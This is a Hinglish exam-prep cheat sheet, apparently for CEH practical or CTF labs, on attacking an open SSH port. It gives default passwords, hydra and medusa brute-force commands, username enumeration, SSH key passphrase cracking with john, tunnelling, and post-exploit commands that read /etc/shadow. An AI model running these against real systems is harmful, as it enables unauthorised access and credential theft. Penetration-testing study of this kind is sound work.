# 🔓 SSH PORT OPEN MILA (22) — Ab Kya?

---

## CASE 1: Default / Known Creds Try Karo
```bash
ssh msfadmin@<IP>              # msfadmin:msfadmin (Metasploitable)
ssh root@<IP>                  # root:toor, root:root
ssh admin@<IP>                 # admin:admin, admin:password
```
> Login hua? → CASE 5 (Post-Exploit)
> Access denied? → CASE 2 ya 3

---

## CASE 2: Brute Force SSH
```bash
hydra -l <USER> -P /usr/share/wordlists/rockyou.txt <IP> ssh -t 4
hydra -L users.txt -P passwords.txt <IP> ssh -t 4
medusa -h <IP> -u root -P /usr/share/wordlists/rockyou.txt -M ssh
```
> `-t 4` zaroor rakho — SSH zyada threads handle nahi karta

> Username nahi pata? Pehle enumerate karo:
> - SMB se: `enum4linux -U <IP>`
> - SMTP se: `smtp-user-enum -M VRFY -U /usr/share/wordlists/metasploit/unix_users.txt -t <IP>`

---

## CASE 3: SSH Key Based Login
```bash
# Agar id_rsa key mili hai (FTP/SMB/web se):
chmod 600 id_rsa
ssh -i id_rsa user@<IP>
```
> Permission denied (publickey)? Key ka passphrase crack karo:
```bash
ssh2john.py id_rsa > ssh_hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash.txt
john --show ssh_hash.txt
```

---

## CASE 4: SSH Tunneling / Port Forwarding
```bash
# Local port forward (access remote service through SSH)
ssh -L 8080:127.0.0.1:80 user@<IP>
# Ab browser mein localhost:8080 kholo

# Dynamic SOCKS proxy
ssh -D 9050 user@<IP>
```
> Rare in CEH practical but agar internal network access chahiye

---

## CASE 5: Post-Exploit (SSH Login Ho Gaya)
```bash
whoami && id
uname -a
cat /etc/passwd
sudo -l                        # kya sudo kar sakte ho?
cat /etc/shadow                # agar root ho
find / -name "flag*" 2>/dev/null
cat /root/flag.txt
cat /home/*/flag.txt
ls -la /home/
history                        # previous commands dekho
```

---

## CASE 6: SSH Version → Known Exploits
```bash
nmap -sV -p 22 <IP>
searchsploit openssh <version>
```
> Mostly SSH direct exploit nahi hota — brute force ya key reuse hota hai

---

## CASE 7: Credential Reuse
> Agar kisi aur service se creds mile (MySQL, FTP, Web):
```bash
ssh found_user@<IP>            # same password try karo
```
> Bahut common hai exam mein — ek jagah se creds lo, SSH mein use karo

---

## QUICK DECISION:
```
SSH open
  ├─ Default creds try karo (msfadmin/root/admin)
  ├─ Brute force: hydra -l user -P rockyou.txt <IP> ssh
  ├─ SSH key mili? → chmod 600 → ssh -i key user@IP
  ├─ Key passphrase? → ssh2john → john → crack
  ├─ Creds kisi aur service se mile? → Reuse on SSH
  └─ Login hua → whoami, sudo -l, find flag
```
